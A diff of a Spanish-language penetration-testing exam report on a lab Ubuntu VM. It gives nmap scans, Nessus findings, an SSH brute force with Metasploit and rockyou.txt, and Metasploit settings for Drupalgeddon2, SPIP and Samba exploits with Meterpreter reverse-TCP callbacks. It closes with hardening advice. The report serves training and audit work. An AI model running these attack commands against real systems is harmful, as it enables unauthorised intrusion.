@@ -1,207 +1,291 @@
 # MEMORIA COMPLETA DE AUDITORÍA DE SEGURIDAD
+
 ## Contexto del Examen
-En este ejercicio de auditoría de seguridad, se nos proporcionó una máquina virtual objetivo con sistema Ubuntu que debíamos analizar, identificando vulnerabilidades y intentando su explotación. La máquina atacante utilizada fue Kali Linux, con ambas máquinas conectadas en la red NAT 10.0.2.0/24 para facilitar la comunicación y las pruebas.
+
+En este ejercicio de auditoría de seguridad, se proporcionó una máquina virtual objetivo con sistema Ubuntu que debíamos analizar, identificando vulnerabilidades y explotándolas. La máquina atacante utilizada fue **Kali Linux**, con ambas máquinas conectadas en la red NAT `10.0.2.0/24` para facilitar la comunicación y las pruebas.
+
 ---
 
-![Maquina](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/Ubuntu.png)
+![Máquina Ubuntu](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/Ubuntu.png)
 
-![Red2](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/Red2.png)
+![Configuración de Red](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/Red2.png)
 
-## 1 Configuración Inicial
-Lo primero que realizamos fue introducir la máquina víctima en nuestra red NAT 10.0.2.0
+---
 
-![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/Red1.png)
+## 1. Configuración Inicial
 
-A partir de ahí, verificamos la IP de la máquina Kali y procedimos a detectar la IP de la víctima.
+Lo primero que realizamos fue introducir la máquina víctima en nuestra red NAT `10.0.2.0/24`.
 
+![Configuración Red NAT](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/Red1.png)
 
-![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/IPA.png)
+A continuación, verificamos la IP de la máquina Kali y procedimos a detectar la IP de la víctima.
 
-Justificación:
+![Identificación de IP](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/IPA.png)
 
-  - Mantener ambas máquinas (atacante y víctima) en la misma red NAT permite la comunicación directa
+### Justificación
 
-  - Facilita el escaneo y la explotación al estar en el mismo segmento de red
+- Mantener ambas máquinas (atacante y víctima) en la misma red NAT permite la comunicación directa
+- Facilita el escaneo y la explotación al estar en el mismo segmento de red
 
+---
 
-## 2 Descubrimiento de la Máquina Víctima
+## 2. Descubrimiento de la Máquina Víctima
 
-### 2.1 Primer intento: arp-scan
+### 2.1 Primer Intento: arp-scan
 
-Primero robamos un arp-scan para descubrir la máquina, pero no dio información fiable para identificarla como víctima
+Primero probamos un `arp-scan` para descubrir la máquina, pero no proporcionó información fiable para identificarla como víctima.
 
-![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/ARP.png)
+![Resultado arp-scan](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/ARP.png)
 
-### 2.2 Segundo intento: Nmap escaneando toda la red
+### 2.2 Segundo Intento: Nmap (Escaneo Completo de Red)
 
-Comando ejecutado:
+**Comando ejecutado:**
 
-![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/NMAP1.png)
-
-````
+```bash
 nmap -sS -sV -O 10.0.2.5/24 -T5
-````
-Este escaneo completo revelA la IP 10.0.2.20, que coincidE con una máquina Linux con múltiples servicios levantados.
+```
 
-## 3 Enumeración de Servicios
+![Resultado Nmap](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/NMAP1.png)
 
-Parece ser la Máquina en **10.0.2.20** la asociada al examen:
+Este escaneo completo reveló la IP **10.0.2.20**, que coincide con una máquina Linux con múltiples servicios activos.
 
-  Tiene servicios activos como **FTP, SSH, Apache, MySQL, y Jetty**. 
-  Esta parece ser una máquina basada en Linux, y los servicios disponibles pueden ser explotados dependiendo de las vulnerabilidades conocidas.
+---
 
-## 4 Escaneo de vulnerabilidades con Nmap
+## 3. Enumeración de Servicios
 
-Se intentó el clásico comando:
-````
+La máquina objetivo identificada en **10.0.2.20** presenta las siguientes características:
+
+### Servicios Detectados
+
+| Puerto | Servicio | Versión |
+|--------|----------|---------|
+| 21 | FTP | ProFTPd |
+| 22 | SSH | OpenSSH |
+| 80 | HTTP | Apache |
+| 3306 | MySQL | - |
+| 8080 | Jetty | - |
+
+### Análisis
+
+- Sistema operativo: **Linux**
+- Múltiples vectores de ataque potenciales
+- Servicios con vulnerabilidades conocidas
+
+---
+
+## 4. Escaneo de Vulnerabilidades con Nmap
+
+Se intentó el siguiente comando para detección de vulnerabilidades:
+
+```bash
 nmap -sS -sV -O --script vuln 10.0.2.20 -T5
-````
+```
 
-Problemas detectados:
-  - El escaneo tardó demasiado
-  - No devolvió resultados de vulnerabilidades útiles
-  - No detectó la vulnerabilidad de ProFTPd ni nada crítico
+### Problemas Detectados
 
-Conclusión:
-Nmap no fue útil para la fase de vulnerabilidades debido al tiempo y la falta de resultados críticos.
+- El escaneo tardó excesivamente
+- No devolvió resultados de vulnerabilidades útiles
+- No detectó la vulnerabilidad de ProFTPd ni otros fallos críticos
 
-## 5 Análisis en paralelo con Nessus
+### Conclusión
 
-Dado que Nmap no daba resultados, arrancamos Nessus para realizar el analisis
+Nmap no resultó útil para la fase de detección de vulnerabilidades debido al tiempo de ejecución y la falta de resultados críticos.
 
-![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/nessus1.png)
+---
 
-![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/nessus2.png)
+## 5. Análisis en Paralelo con Nessus
 
+Dado que Nmap no proporcionaba resultados satisfactorios, iniciamos **Nessus** para realizar un análisis más profundo.
 
-Se creó un escaneo dirigido a la IP 10.0.2.20.
+![Configuración Nessus](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/nessus1.png)
 
-## 5 Pruebas Manuales de Acceso
+![Escaneo Nessus](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/nessus2.png)
 
-Debido a que las herramientas de Nessus y de nmap estaban dando problemas, fuimos probando diferentes cosas de forma manual, bajo el conocimiento de los puertos abiertos y sus servicios correspondientes.
+Se creó un escaneo específico dirigido a la IP **10.0.2.20**.
 
- ### 5.1 FTP
-  
-  Se intentó:
-  
-   - Acceso anónimo
+---
 
-     ![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/FTP1.png)
-  
-   - root/root
+## 6. Pruebas Manuales de Acceso
 
-     ![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/FTP2.png)
-  
-  Todos fallaron
-  
-### 5.2 HTTP
+Debido a que las herramientas automáticas (Nessus y Nmap) presentaban problemas, procedimos a realizar pruebas manuales basándonos en los puertos abiertos y sus servicios correspondientes.
 
-  Se accedió al servicio web para reconocimiento inicial
+### 6.1 Servicio FTP
 
-  ![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/http1.png)
+**Intentos realizados:**
 
-  Usuario Identificado:
+1. **Acceso anónimo**
+   
+   ![Intento FTP Anónimo](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/FTP1.png)
 
-  ![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/http2.png)
-  
-  Se encontró el usuario "chewbacca" durante la enumeración
+2. **Credenciales por defecto** (`root/root`)
+   
+   ![Intento FTP Root](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/FTP2.png)
 
-  Intentamos usarlo en:
+**Resultado:** Todos los intentos fallaron.
 
-   - SSH
-     
-  ![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/ssh.png)
-    
-   - Explotación de Metasploit
-       Ataque de Fuerza Bruta SSH con Metasploit
-       ![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/sshlogin1.png)
-  
-     ![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/sshlogin2.png)
+### 6.2 Servicio HTTP
 
-     Configuración del módulo:
+Se accedió al servicio web para reconocimiento inicial.
 
-      - Se utilizó el usuario "chewbacca" identificado previamente
-      
-      - Se empleó lista de contraseñas por defecto (rokyou)
-      
-      Resultado:
-     
-      ![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/ssh3.png)
-      
-      - Fallo completo en el ataque de fuerza bruta
-      
-      - Errores de conexión: "connection closed by remote host"
-      
-      - Posible protección contra fuerza bruta en el servicio SSH
-      
-      - El mensaje "Connection reset by peer" sugiere que el servidor cortó la conexión
+![Página Web](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/http1.png)
 
-Ninguno funcionó.
+#### Usuario Identificado
 
-## 6 Vulnerabilidades Nessus
+![Usuario Chewbacca](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/http2.png)
 
-  ### Vulnerabilidad SSL Identificada
+Durante la enumeración se encontró el usuario **"chewbacca"**.
 
-  ![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/ssl.png)
+### 6.3 Intentos de Explotación con Usuario Descubierto
 
-  ### Drupal
-  ![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/drupal.png)
+#### SSH Manual
 
-  Módulo: exploit/unix/webapp/drupal_drupageddon2
-  Payload: php/meterpreter/reverse_tcp
-  
-  Configuración:
-  
-  - LHOST: 10.0.2.5
-  
-  - LPORT: 4444
+![Intento SSH](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/ssh.png)
 
-  Resultado:
+**Resultado:** Acceso denegado.
 
-  - El objetivo apareció como vulnerable
-  
-  - Exploit completado pero no se creó sesión
-  
-  - Posibles causas: Protecciones, versión incorrecta, o filtros de salida
+#### Ataque de Fuerza Bruta SSH con Metasploit
 
-    ### SPIP
+![Configuración SSH Login](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/sshlogin1.png)
 
-    Módulo: exploit/multi/http/spip_connect_exec
-    
-    Configuración:
-    
-    RHOSTS: 10.0.2.20
-    
-    Resultado:
-    
-    No se pudo determinar la versión de SPIP
-    
-    Exploit abortado por imposibilidad de verificar explotabilidad
-    
-    Se sugirió usar set ForceExploit true para override
+![Parámetros SSH Login](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/sshlogin2.png)
 
-    ### Samba
+**Configuración del módulo:**
 
-    ![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/samba.png)
-    ![Red1](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/samba2.png)
+```
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 10.0.2.20
+set USERNAME chewbacca
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+```
 
-Si el Exploit Funciona:
-Conexión reversa establecida
+**Parámetros:**
+- Usuario: `chewbacca` (identificado previamente)
+- Diccionario: `/usr/share/wordlists/rockyou.txt`
 
-Sesión de Meterpreter obtenida
+**Resultado:**
 
-Acceso al sistema Linux objetivo
+![Resultado SSH Brute Force](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/ssh3.png)
 
-Capacidad de ejecutar comandos con privilegios del servicio Samba
+- **Fallo completo** en el ataque de fuerza bruta
+- Errores de conexión: `"connection closed by remote host"`
+- Mensaje `"Connection reset by peer"` sugiere que el servidor cortó la conexión
+- Posible protección contra ataques de fuerza bruta activa en el servicio SSH
 
-Problemas Potenciales (Basado en Patrones Anteriores):
-Timeout en la conexión
+---
 
-Share de solo lectura imposibilitando la escritura
+## 7. Vulnerabilidades Identificadas por Nessus
 
-Servicio Samba parcheado contra esta vulnerabilidad
+### 7.1 Vulnerabilidad SSL
 
-Filtros de red bloqueando la conexión reversa
+![Vulnerabilidad SSL](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/ssl.png)
+
+**Descripción:** Certificados SSL con configuración débil detectados.
+
+### 7.2 Drupal - Drupalgeddon2
+
+![Vulnerabilidad Drupal](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/drupal.png)
+
+**Módulo de Metasploit:**
+
+```
+exploit/unix/webapp/drupal_drupageddon2
+```
+
+**Configuración:**
+
+```ruby
+set RHOSTS 10.0.2.20
+set LHOST 10.0.2.5
+set LPORT 4444
+set PAYLOAD php/meterpreter/reverse_tcp
+```
+
+**Resultado:**
+
+- El objetivo apareció como **vulnerable**
+- Exploit completado pero **no se creó sesión**
+- **Posibles causas:**
+  - Protecciones del sistema
+  - Versión incorrecta del exploit
+  - Filtros de salida bloqueando la conexión reversa
+
+### 7.3 SPIP - Remote Code Execution
+
+**Módulo de Metasploit:**
+
+```
+exploit/multi/http/spip_connect_exec
+```
+
+**Configuración:**
+
+```ruby
+set RHOSTS 10.0.2.20
+```
+
+**Resultado:**
+
+- No se pudo determinar la versión de SPIP
+- Exploit abortado por imposibilidad de verificar explotabilidad
+- Se sugirió usar `set ForceExploit true` para forzar la ejecución
+
+### 7.4 Samba - Remote Code Execution
+
+![Vulnerabilidad Samba](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/samba.png)
+
+![Configuración Samba](https://github.com/rodrigomhz/ExamenCiber/blob/main/Imagenes/samba2.png)
+
+**Módulo de Metasploit:**
+
+```
+exploit/linux/samba/is_known_pipename
+```
+
+**Configuración:**
+
+```ruby
+set RHOSTS 10.0.2.20
+set LHOST 10.0.2.5
+set LPORT 4444
+```
+
+#### Resultado Exitoso Esperado
+
+- Conexión reversa establecida
+- Sesión de Meterpreter obtenida
+- Acceso al sistema Linux objetivo
+- Capacidad de ejecutar comandos con privilegios del servicio Samba
+
+#### Problemas Potenciales (Basado en Patrones Anteriores)
+
+- Timeout en la conexión
+- Share de solo lectura imposibilitando la escritura
+- Servicio Samba parcheado contra esta vulnerabilidad
+- Filtros de red bloqueando la conexión reversa
+
+---
+
+## 8. Conclusiones
+
+### Vulnerabilidades Confirmadas
+
+1. **Drupal** - CVE-2018-7600 (Drupalgeddon2)
+2. **Samba** - Vulnerabilidad de ejecución remota
+3. **SSL/TLS** - Configuración débil
+
+### Recomendaciones
+
+- Actualizar todos los servicios a sus últimas versiones
+- Implementar autenticación de dos factores en SSH
+- Configurar rate limiting para prevenir ataques de fuerza bruta
+- Revisar y fortalecer la configuración SSL/TLS
+- Aplicar parches de seguridad pendientes
+
+---
+
+**Fecha de Auditoría:** [Fecha]  
+**Auditor:** [Nombre]  
+**Nivel de Riesgo Global:** Alto
 
 
 
